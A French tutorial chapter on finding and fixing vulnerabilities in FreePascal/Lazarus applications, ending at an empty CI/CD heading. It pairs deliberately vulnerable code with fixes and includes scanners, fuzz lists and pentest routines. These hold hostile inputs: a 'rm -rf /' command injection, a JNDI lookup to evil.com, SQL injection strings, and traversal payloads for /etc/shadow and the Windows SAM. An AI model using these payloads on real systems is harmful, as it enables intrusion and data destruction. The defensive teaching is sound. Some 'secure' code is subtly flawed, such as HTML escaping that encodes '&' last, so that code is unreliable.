🔝 Retour au [Sommaire](/SOMMAIRE.md)

# 17.7 Analyse de vulnérabilités

## Introduction

L'analyse de vulnérabilités est le processus systématique d'identification, de classification et de correction des failles de sécurité dans une application. C'est une étape essentielle du cycle de développement sécurisé, particulièrement importante pour les applications qui manipulent des données sensibles ou sont exposées sur Internet.

Dans cette section, nous allons explorer comment identifier et corriger les vulnérabilités courantes dans les applications FreePascal/Lazarus, sur Windows et Ubuntu/Linux.

## Pourquoi analyser les vulnérabilités ?

### Les risques

**Sans analyse de vulnérabilités** :
- 🚨 Failles exploitables par des attaquants
- 💰 Pertes financières (vol de données, rançongiciels)
- ⚖️ Non-conformité réglementaire (RGPD, etc.)
- 📉 Perte de confiance des utilisateurs
- 🔓 Compromission de systèmes

**Avec analyse régulière** :
- ✅ Détection précoce des failles
- 🛡️ Réduction de la surface d'attaque
- 📊 Amélioration continue de la sécurité
- 💼 Conformité aux standards
- 🎯 Priorisation des corrections

### Le coût d'une vulnérabilité

```
Découverte pendant le développement → Coût de correction : 1x  
Découverte en test → Coût de correction : 10x  
Découverte en production → Coût de correction : 100x  
Découverte par un attaquant → Coût : IMMENSE
```

## Types de vulnérabilités

### Classification OWASP Top 10

L'OWASP (Open Web Application Security Project) maintient une liste des 10 vulnérabilités les plus critiques :

| Rang | Vulnérabilité | Description |
|------|---------------|-------------|
| 1 | **Broken Access Control** | Contrôle d'accès défaillant |
| 2 | **Cryptographic Failures** | Échecs cryptographiques |
| 3 | **Injection** | Injection SQL, commandes, etc. |
| 4 | **Insecure Design** | Conception non sécurisée |
| 5 | **Security Misconfiguration** | Mauvaise configuration |
| 6 | **Vulnerable Components** | Composants vulnérables |
| 7 | **Authentication Failures** | Échecs d'authentification |
| 8 | **Software/Data Integrity** | Intégrité logiciel/données |
| 9 | **Logging/Monitoring Failures** | Échecs de log/monitoring |
| 10 | **Server-Side Request Forgery** | SSRF |

### Classification CWE

Le CWE (Common Weakness Enumeration) catalogue plus de 600 types de faiblesses logicielles.

**Exemples courants** :
- CWE-89 : Injection SQL
- CWE-79 : Cross-Site Scripting (XSS)
- CWE-120 : Buffer Overflow
- CWE-22 : Path Traversal
- CWE-78 : OS Command Injection
- CWE-798 : Credentials en dur dans le code
- CWE-311 : Données sensibles non chiffrées

## Vulnérabilités courantes en FreePascal

### 1. Injection SQL

**Vulnérabilité** :
```pascal
// ❌ DANGEREUX - Vulnérable à l'injection SQL
procedure SearchUser(const Username: string);  
var
  Query: TSQLQuery;
begin
  Query.SQL.Text := 'SELECT * FROM users WHERE username = ''' + Username + '''';
  Query.Open;
end;

// Attaque possible :
// Username := "admin' OR '1'='1"
// Résultat : SELECT * FROM users WHERE username = 'admin' OR '1'='1'
// → Retourne TOUS les utilisateurs !
```

**Correction** :
```pascal
// ✅ SÉCURISÉ - Utilisation de paramètres
procedure SearchUserSecure(const Username: string);  
var
  Query: TSQLQuery;
begin
  Query.SQL.Text := 'SELECT * FROM users WHERE username = :username';
  Query.ParamByName('username').AsString := Username;
  Query.Open;
end;
```

**Détection** :
```pascal
function DetectSQLInjectionAttempt(const Input: string): Boolean;  
const
  DANGEROUS_PATTERNS: array[0..6] of string = (
    '''', '--', ';', '/*', '*/', 'xp_', 'sp_'
  );
var
  i: Integer;
begin
  Result := False;

  for i := 0 to High(DANGEROUS_PATTERNS) do
  begin
    if Pos(DANGEROUS_PATTERNS[i], Input) > 0 then
    begin
      LogSecurityEvent('SQL_INJECTION_ATTEMPT',
        'Input: ' + Input);
      Result := True;
      Exit;
    end;
  end;
end;
```

### 2. Buffer Overflow

**Vulnérabilité** :
```pascal
// ❌ DANGEREUX - Pas de vérification de taille
procedure CopyUserInput(const Input: string);  
var
  Buffer: array[0..255] of Char;
begin
  Move(Input[1], Buffer[0], Length(Input)); // Peut déborder !
end;
```

**Correction** :
```pascal
// ✅ SÉCURISÉ - Vérification de taille
procedure CopyUserInputSecure(const Input: string);  
var
  Buffer: array[0..255] of Char;
  CopySize: Integer;
begin
  CopySize := Min(Length(Input), SizeOf(Buffer) - 1);
  if CopySize > 0 then
    Move(Input[1], Buffer[0], CopySize);
  Buffer[CopySize] := #0; // Terminateur null
end;
```

### 3. Path Traversal

**Vulnérabilité** :
```pascal
// ❌ DANGEREUX - Permet de lire n'importe quel fichier
function ReadUserFile(const FileName: string): string;  
begin
  Result := ReadFileToString(DataDirectory + FileName);
end;

// Attaque possible :
// FileName := "../../etc/passwd"
// → Lit /etc/passwd !
```

**Correction** :
```pascal
// ✅ SÉCURISÉ - Validation du chemin
function ReadUserFileSecure(const FileName: string): string;  
var
  SafePath: string;
  RealPath: string;
begin
  // Bloquer les caractères dangereux
  if (Pos('..', FileName) > 0) or
     (Pos('/', FileName) > 0) or
     (Pos('\', FileName) > 0) then
  begin
    LogSecurityEvent('PATH_TRAVERSAL_ATTEMPT', 'File: ' + FileName);
    raise Exception.Create('Nom de fichier invalide');
  end;

  // Construire le chemin complet
  SafePath := ExpandFileName(DataDirectory + FileName);
  RealPath := ExpandFileName(DataDirectory);

  // Vérifier que le fichier est bien dans le répertoire autorisé
  if Copy(SafePath, 1, Length(RealPath)) <> RealPath then
  begin
    LogSecurityEvent('PATH_TRAVERSAL_BLOCKED', 'Path: ' + SafePath);
    raise Exception.Create('Accès refusé');
  end;

  Result := ReadFileToString(SafePath);
end;
```

### 4. Command Injection

**Vulnérabilité** :
```pascal
// ❌ DANGEREUX - Injection de commandes
procedure PingHost(const Host: string);  
var
  Command: string;
begin
  Command := 'ping -c 4 ' + Host;
  ExecuteProcess('sh', ['-c', Command]);
end;

// Attaque possible :
// Host := "google.com; rm -rf /"
// → Exécute : ping -c 4 google.com; rm -rf /
```

**Correction** :
```pascal
// ✅ SÉCURISÉ - Validation stricte
procedure PingHostSecure(const Host: string);  
var
  Proc: TProcess;
begin
  // Valider le format de l'hôte
  if not IsValidHostname(Host) then
  begin
    LogSecurityEvent('COMMAND_INJECTION_ATTEMPT', 'Host: ' + Host);
    raise Exception.Create('Nom d''hôte invalide');
  end;

  // Utiliser des paramètres séparés (pas de shell)
  Proc := TProcess.Create(nil);
  try
    Proc.Executable := 'ping';
    Proc.Parameters.Add('-c');
    Proc.Parameters.Add('4');
    Proc.Parameters.Add(Host); // Paramètre séparé, pas interprété
    Proc.Execute;
  finally
    Proc.Free;
  end;
end;

function IsValidHostname(const Host: string): Boolean;  
var
  i: Integer;
  ValidChars: set of Char;
begin
  ValidChars := ['a'..'z', 'A'..'Z', '0'..'9', '.', '-'];

  Result := Length(Host) > 0;
  for i := 1 to Length(Host) do
  begin
    if not (Host[i] in ValidChars) then
    begin
      Result := False;
      Break;
    end;
  end;
end;
```

### 5. Credentials en dur dans le code

**Vulnérabilité** :
```pascal
// ❌ TRÈS DANGEREUX - Credentials visibles
const
  DB_PASSWORD = 'MySecretPassword123';
  API_KEY = 'sk_live_abc123def456';

procedure ConnectDatabase;  
begin
  Connection.Password := DB_PASSWORD; // Visible dans le binaire !
end;
```

**Correction** :
```pascal
// ✅ SÉCURISÉ - Credentials externes
function GetDatabasePassword: string;  
begin
  {$IFDEF WINDOWS}
  Result := UnprotectDataDPAPI(LoadFromFile('db.enc'));
  {$ELSE}
  Result := RetrieveSecret('MonApp', 'db_password');
  {$ENDIF}
end;

procedure ConnectDatabaseSecure;  
begin
  Connection.Password := GetDatabasePassword;
end;
```

### 6. Déni de service (DoS)

**Vulnérabilité** :
```pascal
// ❌ DANGEREUX - Pas de limite
procedure ProcessUserData(const Data: string);  
var
  i: Integer;
begin
  for i := 1 to Length(Data) do
  begin
    // Traitement coûteux
    ProcessByte(Data[i]);
  end;
end;

// Attaque : Envoyer 1 GB de données → Crash ou blocage
```

**Correction** :
```pascal
// ✅ SÉCURISÉ - Limites strictes
const
  MAX_DATA_SIZE = 1024 * 1024; // 1 MB

procedure ProcessUserDataSecure(const Data: string);  
var
  i: Integer;
begin
  // Vérifier la taille
  if Length(Data) > MAX_DATA_SIZE then
  begin
    LogSecurityEvent('DOS_ATTEMPT',
      'Data size: ' + IntToStr(Length(Data)));
    raise Exception.Create('Données trop volumineuses');
  end;

  // Ajouter un timeout
  StartTimeout(5000); // 5 secondes max
  try
    for i := 1 to Length(Data) do
    begin
      if TimeoutExpired then
        raise Exception.Create('Timeout dépassé');
      ProcessByte(Data[i]);
    end;
  finally
    StopTimeout;
  end;
end;
```

### 7. Information Disclosure

**Vulnérabilité** :
```pascal
// ❌ DANGEREUX - Messages d'erreur trop détaillés
procedure HandleError(E: Exception);  
begin
  ShowMessage('Erreur SQL: ' + E.Message);
  // Affiche : "Table 'users' doesn't exist in database 'myapp'"
  // → Révèle la structure de la base !
end;
```

**Correction** :
```pascal
// ✅ SÉCURISÉ - Messages génériques pour l'utilisateur
procedure HandleErrorSecure(E: Exception);  
begin
  // Log détaillé (interne)
  LogError('Erreur: ' + E.Message + ' - ' + E.StackTrace);

  // Message générique pour l'utilisateur
  ShowMessage('Une erreur est survenue. Veuillez réessayer.');

  {$IFDEF DEBUG}
  // En développement seulement
  ShowMessage('DEBUG: ' + E.Message);
  {$ENDIF}
end;
```

## Outils d'analyse de vulnérabilités

### 1. Analyse statique du code

**Recherche de patterns dangereux** :
```pascal
program VulnerabilityScanner;

uses
  SysUtils, Classes;

type
  TVulnerabilityPattern = record
    Pattern: string;
    Severity: string;
    Description: string;
  end;

const
  PATTERNS: array[0..8] of TVulnerabilityPattern = (
    (Pattern: 'SQL.Text := .*\+';
     Severity: 'HIGH';
     Description: 'Possible SQL Injection'),

    (Pattern: 'ExecuteProcess.*\+';
     Severity: 'HIGH';
     Description: 'Possible Command Injection'),

    (Pattern: 'Password.*:=.*''';
     Severity: 'CRITICAL';
     Description: 'Hardcoded Password'),

    (Pattern: 'Move\(.*,.*,.*Length';
     Severity: 'MEDIUM';
     Description: 'Possible Buffer Overflow'),

    (Pattern: '\.\.';
     Severity: 'MEDIUM';
     Description: 'Possible Path Traversal'),

    (Pattern: 'ReadLn\(.*Password';
     Severity: 'LOW';
     Description: 'Password in console (visible)'),

    (Pattern: 'ShowMessage.*Exception';
     Severity: 'LOW';
     Description: 'Information Disclosure'),

    (Pattern: 'Random\(';
     Severity: 'MEDIUM';
     Description: 'Weak RNG (use cryptographic RNG)'),

    (Pattern: 'MD5|SHA1';
     Severity: 'MEDIUM';
     Description: 'Weak Hash Algorithm')
  );

procedure ScanFile(const FileName: string);  
var
  Source: TStringList;
  i, j, LineNum: Integer;
  Line: string;
begin
  WriteLn('Scanning: ', FileName);

  Source := TStringList.Create;
  try
    Source.LoadFromFile(FileName);

    for i := 0 to Source.Count - 1 do
    begin
      Line := Source[i];
      LineNum := i + 1;

      for j := 0 to High(PATTERNS) do
      begin
        // Recherche simple (regex plus robuste recommandé)
        if ContainsPattern(Line, PATTERNS[j].Pattern) then
        begin
          WriteLn(Format('[%s] Line %d: %s',
            [PATTERNS[j].Severity, LineNum, PATTERNS[j].Description]));
          WriteLn('  Code: ', Trim(Line));
        end;
      end;
    end;
  finally
    Source.Free;
  end;
end;

function ContainsPattern(const Text, Pattern: string): Boolean;  
begin
  // Simplification - utilisez RegEx pour plus de précision
  Result := Pos(Pattern, Text) > 0;
end;

// Utilisation
begin
  ScanFile('mainunit.pas');
end.
```

### 2. Analyse dynamique

**Fuzzing basique** :
```pascal
type
  TFuzzTest = record
    Name: string;
    TestFunction: function(const Input: string): Boolean;
  end;

function TestSQLInjection(const Input: string): Boolean;  
var
  Query: TSQLQuery;
begin
  Result := True;
  try
    Query := TSQLQuery.Create(nil);
    try
      Query.SQL.Text := 'SELECT * FROM test WHERE value = :value';
      Query.ParamByName('value').AsString := Input;
      Query.Open;
    finally
      Query.Free;
    end;
  except
    on E: Exception do
    begin
      WriteLn('Vulnerability found with input: ', Input);
      WriteLn('Error: ', E.Message);
      Result := False;
    end;
  end;
end;

procedure RunFuzzTests;  
const
  MALICIOUS_INPUTS: array[0..9] of string = (
    ''' OR ''1''=''1',
    '; DROP TABLE users--',
    '<script>alert("XSS")</script>',
    '../../../etc/passwd',
    '${jndi:ldap://evil.com/a}',
    '%00',
    '../../',
    '`rm -rf /`',
    'admin'' OR 1=1--',
    'UNION SELECT * FROM passwords'
  );
var
  i: Integer;
  PassCount, FailCount: Integer;
begin
  PassCount := 0;
  FailCount := 0;

  WriteLn('=== Fuzz Testing ===');

  for i := 0 to High(MALICIOUS_INPUTS) do
  begin
    if TestSQLInjection(MALICIOUS_INPUTS[i]) then
      Inc(PassCount)
    else
      Inc(FailCount);
  end;

  WriteLn;
  WriteLn('Results:');
  WriteLn('  Passed: ', PassCount);
  WriteLn('  Failed: ', FailCount);

  if FailCount > 0 then
    WriteLn('⚠️ Vulnerabilities detected!')
  else
    WriteLn('✓ All tests passed');
end;
```

### 3. Vérification des dépendances

```pascal
type
  TDependency = record
    Name: string;
    Version: string;
    HasVulnerabilities: Boolean;
    CVEs: TStringList;
  end;

function CheckDependencyVulnerabilities(const DependencyName, Version: string): TDependency;  
begin
  Result.Name := DependencyName;
  Result.Version := Version;
  Result.CVEs := TStringList.Create;

  // Vérifier contre une base de données de CVE
  // (Simulation - en pratique, interroger une API comme NVD)

  if (DependencyName = 'OpenSSL') and (Version = '1.0.1') then
  begin
    Result.HasVulnerabilities := True;
    Result.CVEs.Add('CVE-2014-0160 (Heartbleed)');
  end
  else if (DependencyName = 'libxml2') and (Version < '2.9.0') then
  begin
    Result.HasVulnerabilities := True;
    Result.CVEs.Add('CVE-2015-xxxx');
  end
  else
    Result.HasVulnerabilities := False;
end;

procedure AuditDependencies;  
var
  Deps: array of TDependency;
  i, j: Integer;
begin
  SetLength(Deps, 3);

  Deps[0] := CheckDependencyVulnerabilities('OpenSSL', '3.0.2');
  Deps[1] := CheckDependencyVulnerabilities('zlib', '1.2.11');
  Deps[2] := CheckDependencyVulnerabilities('libxml2', '2.9.10');

  WriteLn('=== Dependency Audit ===');

  for i := 0 to High(Deps) do
  begin
    WriteLn(Deps[i].Name, ' ', Deps[i].Version);

    if Deps[i].HasVulnerabilities then
    begin
      WriteLn('  ⚠️ VULNERABILITIES FOUND:');
      for j := 0 to Deps[i].CVEs.Count - 1 do
        WriteLn('    - ', Deps[i].CVEs[j]);
    end
    else
      WriteLn('  ✓ No known vulnerabilities');
  end;
end;
```

## Checklist de sécurité

### Validation des entrées

```pascal
type
  TInputValidator = class
  public
    class function ValidateEmail(const Email: string): Boolean;
    class function ValidateURL(const URL: string): Boolean;
    class function ValidateFilename(const Filename: string): Boolean;
    class function SanitizeHTML(const HTML: string): string;
    class function SanitizeSQL(const Input: string): string;
  end;

class function TInputValidator.ValidateEmail(const Email: string): Boolean;  
const
  EMAIL_REGEX = '^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$';
begin
  // Validation basique (regex complète recommandée)
  Result := (Pos('@', Email) > 0) and
            (Pos('.', Email) > Pos('@', Email)) and
            (Length(Email) >= 5) and
            (Length(Email) <= 254);
end;

class function TInputValidator.ValidateFilename(const Filename: string): Boolean;  
const
  FORBIDDEN_CHARS = ['\', '/', ':', '*', '?', '"', '<', '>', '|'];
var
  i: Integer;
begin
  Result := Length(Filename) > 0;

  // Vérifier les caractères interdits
  for i := 1 to Length(Filename) do
  begin
    if Filename[i] in FORBIDDEN_CHARS then
    begin
      Result := False;
      Break;
    end;
  end;

  // Vérifier les noms réservés Windows
  {$IFDEF WINDOWS}
  if UpperCase(Filename) in ['CON', 'PRN', 'AUX', 'NUL',
     'COM1', 'COM2', 'LPT1', 'LPT2'] then
    Result := False;
  {$ENDIF}
end;

class function TInputValidator.SanitizeHTML(const HTML: string): string;  
begin
  Result := HTML;

  // Échapper les caractères dangereux
  Result := StringReplace(Result, '<', '&lt;', [rfReplaceAll]);
  Result := StringReplace(Result, '>', '&gt;', [rfReplaceAll]);
  Result := StringReplace(Result, '"', '&quot;', [rfReplaceAll]);
  Result := StringReplace(Result, '''', '&#39;', [rfReplaceAll]);
  Result := StringReplace(Result, '&', '&amp;', [rfReplaceAll]);
end;
```

### Gestion des erreurs sécurisée

```pascal
type
  TSecureErrorHandler = class
  private
    class var FLogFile: string;
  public
    class procedure HandleException(E: Exception; const Context: string);
    class procedure HandleSQLException(E: Exception);
    class procedure HandleFileException(E: Exception);
    class function GetUserFriendlyMessage(E: Exception): string;
  end;

class procedure TSecureErrorHandler.HandleException(E: Exception;
                                                     const Context: string);
begin
  // Log complet (interne)
  WriteLnToLog(Format('[ERROR] %s - Context: %s, Message: %s, Stack: %s',
    [DateTimeToStr(Now), Context, E.Message, GetStackTrace(E)]));

  // Message utilisateur (générique)
  {$IFNDEF DEBUG}
  ShowMessage(GetUserFriendlyMessage(E));
  {$ELSE}
  ShowMessage('DEBUG: ' + E.Message);
  {$ENDIF}
end;

class function TSecureErrorHandler.GetUserFriendlyMessage(E: Exception): string;  
begin
  if E is EDatabaseError then
    Result := 'Erreur de base de données. Veuillez réessayer.'
  else if E is EFileNotFoundException then
    Result := 'Fichier introuvable.'
  else if E is EAccessViolation then
    Result := 'Erreur d''accès. Veuillez contacter le support.'
  else
    Result := 'Une erreur est survenue. Veuillez réessayer.';
end;
```

### Audit et logging

```pascal
type
  TSecurityAudit = class
  public
    class procedure LogAuthenticationAttempt(const Username: string; Success: Boolean);
    class procedure LogDataAccess(const Resource: string; const Action: string);
    class procedure LogSecurityEvent(const EventType: string; const Details: string);
    class procedure LogPrivilegeEscalation(const User: string; const RequestedPrivilege: string);
  end;

class procedure TSecurityAudit.LogAuthenticationAttempt(const Username: string;
                                                         Success: Boolean);
var
  LogEntry: string;
begin
  LogEntry := Format('[AUTH] %s - User: %s, Success: %s, IP: %s',
    [DateTimeToStr(Now), Username, BoolToStr(Success), GetClientIP]);

  WriteLnToLog(LogEntry);

  // Alerter si trop d'échecs
  if not Success then
  begin
    Inc(FailedAttempts[Username]);

    if FailedAttempts[Username] >= 5 then
    begin
      SendSecurityAlert('BRUTE_FORCE_ATTEMPT',
        'User: ' + Username + ', Attempts: ' + IntToStr(FailedAttempts[Username]));
    end;
  end
  else
    FailedAttempts[Username] := 0;
end;

class procedure TSecurityAudit.LogDataAccess(const Resource: string;
                                              const Action: string);
begin
  WriteLnToLog(Format('[DATA_ACCESS] %s - Resource: %s, Action: %s, User: %s',
    [DateTimeToStr(Now), Resource, Action, GetCurrentUser]));
end;
```

## Tests de pénétration (Pentest)

### Tests basiques à effectuer

**1. Test d'injection SQL** :
```pascal
procedure TestSQLInjectionVulnerabilities;  
const
  SQL_INJECTION_PAYLOADS: array[0..4] of string = (
    ''' OR ''1''=''1',
    '''; DROP TABLE users--',
    ''' UNION SELECT NULL--',
    ''') OR (''1''=''1',
    ''' OR 1=1--'
  );
var
  i: Integer;
  Vulnerable: Boolean;
begin
  WriteLn('=== SQL Injection Test ===');
  Vulnerable := False;

  for i := 0 to High(SQL_INJECTION_PAYLOADS) do
  begin
    if TestLoginForm('admin', SQL_INJECTION_PAYLOADS[i]) then
    begin
      WriteLn('⚠️ VULNERABLE to: ', SQL_INJECTION_PAYLOADS[i]);
      Vulnerable := True;
    end;
  end;

  if not Vulnerable then
    WriteLn('✓ No SQL injection vulnerabilities found');
end;
```

**2. Test de buffer overflow** :
```pascal
procedure TestBufferOverflow;  
var
  LongString: string;
  i: Integer;
begin
  WriteLn('=== Buffer Overflow Test ===');

  // Créer une chaîne très longue
  SetLength(LongString, 100000);
  for i := 1 to Length(LongString) do
    LongString[i] := 'A';

  try
    ProcessUserInput(LongString);
    WriteLn('✓ Handled long input correctly');
  except
    on E: Exception do
    begin
      WriteLn('⚠️ CRASH with long input: ', E.Message);
    end;
  end;
end;
```

**3. Test de path traversal** :
```pascal
procedure TestPathTraversal;  
const
  PATH_PAYLOADS: array[0..3] of string = (
    '../../../etc/passwd',
    '..\..\..\..\Windows\System32\config\sam',
    'file:///etc/shadow',
    '....//....//....//etc/passwd'
  );
var
  i: Integer;
  Content: string;
begin
  WriteLn('=== Path Traversal Test ===');

  for i := 0 to High(PATH_PAYLOADS) do
  begin
    try
      Content := ReadUserFile(PATH_PAYLOADS[i]);
      if Content <> '' then
        WriteLn('⚠️ VULNERABLE: Successfully read ', PATH_PAYLOADS[i]);
    except
      WriteLn('✓ Blocked: ', PATH_PAYLOADS[i]);
    end;
  end;
end;
```

## Correction des vulnérabilités

### Processus de correction

```
1. Identification
   ↓
2. Évaluation de la gravité (CVSS Score)
   ↓
3. Priorisation
   ↓
4. Développement du correctif
   ↓
5. Test du correctif
   ↓
6. Déploiement
   ↓
7. Vérification post-déploiement
   ↓
8. Documentation
```

### Priorisation selon la gravité

| Score CVSS | Gravité | Délai de correction |
|------------|---------|---------------------|
| 9.0 - 10.0 | Critique | Immédiat (< 24h) |
| 7.0 - 8.9 | Haute | Urgent (< 7 jours) |
| 4.0 - 6.9 | Moyenne | Planifié (< 30 jours) |
| 0.1 - 3.9 | Faible | Opportunité (< 90 jours) |

### Template de correctif

```pascal
{
  Vulnerability ID: VULNS-2024-001
  Severity: HIGH
  Description: SQL Injection in user search
  Affected: UserSearchForm.pas, line 42
  Discovered: 2024-01-15
  Fixed: 2024-01-16
  By: John Doe
}

// AVANT (vulnérable)
{
procedure TUserSearchForm.SearchButtonClick(Sender: TObject);  
begin
  Query.SQL.Text := 'SELECT * FROM users WHERE username = ''' +
                    EditUsername.Text + '''';
  Query.Open;
end;
}

// APRÈS (corrigé)
procedure TUserSearchForm.SearchButtonClick(Sender: TObject);  
begin
  // Validation d'entrée
  if not IsValidUsername(EditUsername.Text) then
  begin
    ShowMessage('Nom d''utilisateur invalide');
    LogSecurityEvent('INVALID_USERNAME_ATTEMPT', EditUsername.Text);
    Exit;
  end;

  // Utilisation de paramètres
  Query.SQL.Text := 'SELECT * FROM users WHERE username = :username';
  Query.ParamByName('username').AsString := EditUsername.Text;

  try
    Query.Open;
    LogDataAccess('users', 'search');
  except
    on E: Exception do
    begin
      TSecureErrorHandler.HandleSQLException(E);
    end;
  end;
end;

function IsValidUsername(const Username: string): Boolean;  
const
  MAX_LENGTH = 50;
  VALID_CHARS = ['a'..'z', 'A'..'Z', '0'..'9', '_', '-', '.'];
var
  i: Integer;
begin
  Result := (Length(Username) > 0) and (Length(Username) <= MAX_LENGTH);

  if Result then
  begin
    for i := 1 to Length(Username) do
    begin
      if not (Username[i] in VALID_CHARS) then
      begin
        Result := False;
        Break;
      end;
    end;
  end;
end;
```

## Automatisation de la détection

### Script de scan automatique

```pascal
program VulnerabilityAutoScan;

{$mode objfpc}{$H+}

uses
  SysUtils, Classes, RegExpr;

type
  TVulnerabilityReport = record
    FileName: string;
    LineNumber: Integer;
    Severity: string;
    VulnType: string;
    Code: string;
    Recommendation: string;
  end;

  TVulnerabilityScanner = class
  private
    FReports: TList;
    procedure ScanForSQLInjection(const FileName: string; Source: TStringList);
    procedure ScanForCommandInjection(const FileName: string; Source: TStringList);
    procedure ScanForHardcodedCredentials(const FileName: string; Source: TStringList);
    procedure ScanForBufferOverflow(const FileName: string; Source: TStringList);
    procedure AddReport(const Report: TVulnerabilityReport);
  public
    constructor Create;
    destructor Destroy; override;
    procedure ScanFile(const FileName: string);
    procedure ScanDirectory(const Directory: string);
    procedure GenerateReport(const OutputFile: string);
    property Reports: TList read FReports;
  end;

constructor TVulnerabilityScanner.Create;  
begin
  inherited Create;
  FReports := TList.Create;
end;

destructor TVulnerabilityScanner.Destroy;  
begin
  FReports.Free;
  inherited Destroy;
end;

procedure TVulnerabilityScanner.ScanForSQLInjection(const FileName: string;
                                                     Source: TStringList);
var
  i: Integer;
  Line: string;
  Report: TVulnerabilityReport;
begin
  for i := 0 to Source.Count - 1 do
  begin
    Line := Source[i];

    // Détecter SQL.Text := ... + variable
    if (Pos('SQL.Text', Line) > 0) and
       (Pos(':=', Line) > 0) and
       (Pos('+', Line) > Pos(':=', Line)) then
    begin
      Report.FileName := FileName;
      Report.LineNumber := i + 1;
      Report.Severity := 'HIGH';
      Report.VulnType := 'SQL Injection';
      Report.Code := Trim(Line);
      Report.Recommendation := 'Utilisez des paramètres SQL au lieu de concaténation';

      AddReport(Report);
    end;
  end;
end;

procedure TVulnerabilityScanner.ScanForCommandInjection(const FileName: string;
                                                         Source: TStringList);
var
  i: Integer;
  Line: string;
  Report: TVulnerabilityReport;
begin
  for i := 0 to Source.Count - 1 do
  begin
    Line := Source[i];

    // Détecter ExecuteProcess avec concaténation
    if (Pos('ExecuteProcess', Line) > 0) or
       (Pos('RunCommand', Line) > 0) then
    begin
      if Pos('+', Line) > 0 then
      begin
        Report.FileName := FileName;
        Report.LineNumber := i + 1;
        Report.Severity := 'CRITICAL';
        Report.VulnType := 'Command Injection';
        Report.Code := Trim(Line);
        Report.Recommendation := 'Validez les entrées et utilisez des paramètres séparés';

        AddReport(Report);
      end;
    end;
  end;
end;

procedure TVulnerabilityScanner.ScanForHardcodedCredentials(const FileName: string;
                                                             Source: TStringList);
var
  i: Integer;
  Line: string;
  Report: TVulnerabilityReport;
  RegEx: TRegExpr;
begin
  RegEx := TRegExpr.Create;
  try
    // Pattern pour détecter des credentials
    RegEx.Expression := '(password|passwd|pwd|secret|key|token)\s*[:=]\s*[''"][\w\d]+[''"]';
    RegEx.ModifierI := True; // Case insensitive

    for i := 0 to Source.Count - 1 do
    begin
      Line := LowerCase(Source[i]);

      if RegEx.Exec(Line) then
      begin
        Report.FileName := FileName;
        Report.LineNumber := i + 1;
        Report.Severity := 'CRITICAL';
        Report.VulnType := 'Hardcoded Credentials';
        Report.Code := Trim(Source[i]); // Ligne originale
        Report.Recommendation := 'Stockez les credentials dans un coffre-fort sécurisé';

        AddReport(Report);
      end;
    end;
  finally
    RegEx.Free;
  end;
end;

procedure TVulnerabilityScanner.ScanForBufferOverflow(const FileName: string;
                                                       Source: TStringList);
var
  i: Integer;
  Line: string;
  Report: TVulnerabilityReport;
begin
  for i := 0 to Source.Count - 1 do
  begin
    Line := Source[i];

    // Détecter Move() avec Length() sans vérification
    if (Pos('Move(', Line) > 0) and
       (Pos('Length(', Line) > 0) and
       not (Pos('Min(', Line) > 0) then
    begin
      Report.FileName := FileName;
      Report.LineNumber := i + 1;
      Report.Severity := 'MEDIUM';
      Report.VulnType := 'Potential Buffer Overflow';
      Report.Code := Trim(Line);
      Report.Recommendation := 'Vérifiez la taille avant Move() avec Min()';

      AddReport(Report);
    end;
  end;
end;

procedure TVulnerabilityScanner.AddReport(const Report: TVulnerabilityReport);  
var
  ReportPtr: ^TVulnerabilityReport;
begin
  New(ReportPtr);
  ReportPtr^ := Report;
  FReports.Add(ReportPtr);
end;

procedure TVulnerabilityScanner.ScanFile(const FileName: string);  
var
  Source: TStringList;
begin
  if not FileExists(FileName) then
    Exit;

  Source := TStringList.Create;
  try
    Source.LoadFromFile(FileName);

    ScanForSQLInjection(FileName, Source);
    ScanForCommandInjection(FileName, Source);
    ScanForHardcodedCredentials(FileName, Source);
    ScanForBufferOverflow(FileName, Source);
  finally
    Source.Free;
  end;
end;

procedure TVulnerabilityScanner.ScanDirectory(const Directory: string);  
var
  SearchRec: TSearchRec;
  Path: string;
begin
  Path := IncludeTrailingPathDelimiter(Directory);

  if FindFirst(Path + '*.pas', faAnyFile, SearchRec) = 0 then
  begin
    repeat
      if (SearchRec.Name <> '.') and (SearchRec.Name <> '..') then
      begin
        if (SearchRec.Attr and faDirectory) = 0 then
          ScanFile(Path + SearchRec.Name)
        else
          ScanDirectory(Path + SearchRec.Name);
      end;
    until FindNext(SearchRec) <> 0;
    FindClose(SearchRec);
  end;
end;

procedure TVulnerabilityScanner.GenerateReport(const OutputFile: string);  
var
  F: TextFile;
  i: Integer;
  Report: ^TVulnerabilityReport;
  CriticalCount, HighCount, MediumCount, LowCount: Integer;
begin
  CriticalCount := 0;
  HighCount := 0;
  MediumCount := 0;
  LowCount := 0;

  AssignFile(F, OutputFile);
  Rewrite(F);
  try
    WriteLn(F, '=== VULNERABILITY SCAN REPORT ===');
    WriteLn(F, 'Generated: ', DateTimeToStr(Now));
    WriteLn(F, 'Total Issues: ', FReports.Count);
    WriteLn(F, '');

    // Compter par sévérité
    for i := 0 to FReports.Count - 1 do
    begin
      Report := FReports[i];
      case Report^.Severity of
        'CRITICAL': Inc(CriticalCount);
        'HIGH': Inc(HighCount);
        'MEDIUM': Inc(MediumCount);
        'LOW': Inc(LowCount);
      end;
    end;

    WriteLn(F, 'Summary:');
    WriteLn(F, '  Critical: ', CriticalCount);
    WriteLn(F, '  High: ', HighCount);
    WriteLn(F, '  Medium: ', MediumCount);
    WriteLn(F, '  Low: ', LowCount);
    WriteLn(F, '');
    WriteLn(F, '=== DETAILED FINDINGS ===');
    WriteLn(F, '');

    // Détails
    for i := 0 to FReports.Count - 1 do
    begin
      Report := FReports[i];
      WriteLn(F, Format('[%d] [%s] %s', [i + 1, Report^.Severity, Report^.VulnType]));
      WriteLn(F, '  File: ', Report^.FileName);
      WriteLn(F, '  Line: ', Report^.LineNumber);
      WriteLn(F, '  Code: ', Report^.Code);
      WriteLn(F, '  Fix: ', Report^.Recommendation);
      WriteLn(F, '');
    end;
  finally
    CloseFile(F);
  end;

  WriteLn('Report generated: ', OutputFile);
end;

// Programme principal
var
  Scanner: TVulnerabilityScanner;
begin
  WriteLn('=== Vulnerability Auto-Scanner ===');
  WriteLn;

  Scanner := TVulnerabilityScanner.Create;
  try
    // Scanner le projet
    WriteLn('Scanning directory: ', GetCurrentDir);
    Scanner.ScanDirectory(GetCurrentDir);

    WriteLn('Found ', Scanner.Reports.Count, ' potential vulnerabilities');

    // Générer le rapport
    Scanner.GenerateReport('vulnerability_report.txt');

    WriteLn('Scan complete!');
  finally
    Scanner.Free;
  end;

  ReadLn;
end.
```

## Intégration dans le CI/CD

